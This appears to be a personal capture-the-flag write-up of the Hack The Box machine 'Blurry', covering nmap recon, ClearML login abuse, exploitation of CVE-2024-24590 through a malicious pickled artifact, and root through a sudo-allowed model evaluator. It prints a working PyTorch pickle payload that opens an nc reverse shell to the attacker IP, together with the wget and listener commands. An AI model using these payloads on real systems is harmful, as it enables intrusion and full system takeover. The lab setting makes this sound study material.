TARGET: 10.129.28.253
ME: 10.10.14.217

# NMAP TCP

```
┌──(xmen㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- -Pn 10.129.28.253 --max-retries 1
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-22 00:52 -0400
Warning: 10.129.28.253 giving up on port because retransmission cap hit (1).
Nmap scan report for app.blurry.htb (10.129.28.253)
Host is up (0.051s latency).
Not shown: 64985 closed tcp ports (reset), 548 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: ClearML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.87 seconds
```

# Port 80

Added app.blurry.htb to /etc/hosts and navigated to find clearML

Seems to allow login by just providing a Full Name

Logging in as test showed a user named Chad Jippity running periodic tasks and some task history for a project "Black Swan"

Able to log out and log in as them using their Full Name

Also able to submit tasks for this project using new credentials from there

Installed clearml in a new venv and did clearml-init using those credentials to get the ability to upload tasks and artifacts

This all pointed to using clearML to get RCE and quickly found a writeup on [various CVEs in clearML](https://www.hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain#cve-2024-24590-pickle-load-on-artifact-get) as well as an exploit PoC pickling and uploading a revshell for CVE-2024-24590 [here](https://github.com/OxyDeV2/ClearML-CVE-2024-24590)

Able to recreate this exploit to upload a task with artifact to clearML

```
└─$ python exp.py --project_name 'Black Swan' --task_name 'Models' --tags review --artifact_name exp1 --ip 10.10.14.217 --port 9001
ClearML Task: created new task id=33185e7bfa5f4631b2169a7cb29c3c50
ClearML results page: http://app.blurry.htb/projects/116c40b9b53743689239b6b460efd7be/experiments/33185e7bfa5f4631b2169a7cb29c3c50/output/log
2026-04-22 01:39:43,615 - clearml.resource_monitor - WARNING - Could not fetch GPU stats: NVML Shared Library Not Found
2026-04-22 01:39:43,641 - clearml.Task - INFO - No repository found, storing script code instead
CLEARML-SERVER new package available: UPGRADE to v2.4.0 is recommended!
Release Notes:
### New features and improvements
- Add show/hide matching filter control to UI Task Scalars and Plots ([ClearML #744](https://github.com/clearml/clearml/issues/744), [ClearML #1253](https://github.com/clearml/clearml/issues/1253))
- Task Comparison view: Display task color indicators in task list instead of task legend ([ClearML #1461](https://github.com/clearml/clearml/issues/1461))
- Add support for setting task type during UI task creation ([ClearML Web #115](https://github.com/clearml/clearml-web/issues/115))
- Add configuration-based overrides for default Elasticsearch mappings
- Add UI task clone options to reset Python requirements
- Update Elastic to version 8.19.9
- Make Task Repository URL in Task Execution tab clickable
- Support short project names (fewer than 3 characters)

### Bug Fixes
- Fix API Server sometimes crashes on sharded Redis deployments ([ClearML Server #305](https://github.com/clearml/clearml-server/issues/305))
- Fix UI bulk task reset affecting published tasks ([ClearML #1490](https://github.com/clearml/clearml/issues/1490))
- UI Object table filters:
  * Fix "User" filter in UI "All Models" table not displaying users who have no tasks
  * Fix "User" filter displaying outdated user names after name change
- Fix tasks not appearing in the correct queue after being moved in UI Orchestration > Queues
- Fix UI Task Scalars tab hiding multiple graphs with the same name when toggling one
- Fix Scientific notation can't be used in integer/float fields in UI Pipeline "New Run" modal
- Fix "Enqueue" button is enabled in UI Task "Enqueue" / " Retry" modal when "Queue" field is blank
- Global search
  * Fix filter section not displaying by default when switching from Advanced to Basic search modes
  * Fix filter indicator appearing on all search tabs instead of the active tab
  * Fix spaces being removed while typing in search term
- Fix Project Path icon displayed on Root Project folder in UI Reports page
- Fix last graph legends in UI task table comparison view are obscured
- Fix project tag filters displaying task tags in UI Projects
- Fix sorting not working in UI task comparison selection
- Fix missing "Edit" button in task Configuration tab
- Fix UI comparison plots incorrectly merging subplots with multiple variants
- Fix “No data to show” message incorrectly appearing while UI pages load
- Fix Projects Workload graph's tooltip does not display all legends
[+] Initializing ClearML task with project name: Black Swan, task name: Models, tags: ['review']
[+] Uploading artifact with name: exp1
ClearML Monitor: GPU monitoring failed getting GPU reading, switching off GPU monitoring
```

Looking at the "Review JSON Artifacts" task shows it seems to look for tasks tagged for review and gets their artifacts (which the writeup says is the part which causes unsafe deserialization of the pickle)

This allows for us to upload and tag a task, which gets picked up after a bit of waiting giving shell on the nc listener

```
└─$ sudo nc -lvnp 9001                                     
[sudo] password for xmen: 
listening on [any] 9001 ...
connect to [10.10.14.217] from (UNKNOWN) [10.129.28.253] 33066
sh: 0: can't access tty; job control turned off
$ id
uid=1000(jippity) gid=1000(jippity) groups=1000(jippity)
$ python -c 'import pty; pty.spawn("/bin/bash")'
sh: 2: python: not found
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
jippity@blurry:~$ whoami
whoami
jippity
jippity@blurry:~$ 
```

# Shell as jippity

sudo seems to allow for evaluating a model with SUID bit as root

```
jippity@blurry:~$ sudo -l
sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
jippity@blurry:~$ 
```

Able to write to that models directory:

```
jippity@blurry:~$ ls -la /models
ls -la /models
total 1068
drwxrwxr-x  2 root jippity    4096 Jun 17  2024 .
drwxr-xr-x 19 root root       4096 Jun  3  2024 ..
-rw-r--r--  1 root root    1077880 May 30  2024 demo_model.pth
-rw-r--r--  1 root root       2547 May 30  2024 evaluate_model.py
jippity@blurry:~$ touch /models/a.pth
touch /models/a.pth
jippity@blurry:~$ ls -la /models
ls -la /models
total 1068
drwxrwxr-x  2 root    jippity    4096 Apr 21 18:54 .
drwxr-xr-x 19 root    root       4096 Jun  3  2024 ..
-rw-r--r--  1 jippity jippity       0 Apr 21 18:54 a.pth
-rw-r--r--  1 root    root    1077880 May 30  2024 demo_model.pth
-rw-r--r--  1 root    root       2547 May 30  2024 evaluate_model.py
jippity@blurry:~$ 
```

Able to create a bad pytorch module, copy it to the box and run it

```
import torch
import os


class Payload:
    def __reduce__(self):
        return (os.system, ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.217 9002 >/tmp/f",))


sploit = Payload()
torch.save(sploit, 'mnist.pth')
```

```
jippity@blurry:~$ wget http://10.10.14.217/mnist.pth
wget http://10.10.14.217/mnist.pth
--2026-04-21 20:46:08--  http://10.10.14.217/mnist.pth
Connecting to 10.10.14.217:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1313 (1.3K) [application/octet-stream]
Saving to: ‘mnist.pth’

mnist.pth           100%[===================>]   1.28K  --.-KB/s    in 0.008s  

2026-04-21 20:46:08 (157 KB/s) - ‘mnist.pth’ saved [1313/1313]

jippity@blurry:~$ cp mnist.pth /models/mnist.pth
cp mnist.pth /models/mnist.pth
jippity@blurry:~$ sudo /usr/bin/evaluate_model /models/mnist.pth
sudo /usr/bin/evaluate_model /models/mnist.pth
[+] Model /models/mnist.pth is considered safe. Processing...
```

# Shell as Root

```
┌──(xmen㉿kali)-[~/clearml]
└─$ sudo nc -lvnp 9002                                     
[sudo] password for xmen: 
listening on [any] 9002 ...
connect to [10.10.14.217] from (UNKNOWN) [10.129.28.253] 54026
root@blurry:/home/jippity# id
id
uid=0(root) gid=0(root) groups=0(root)
```

==DONE==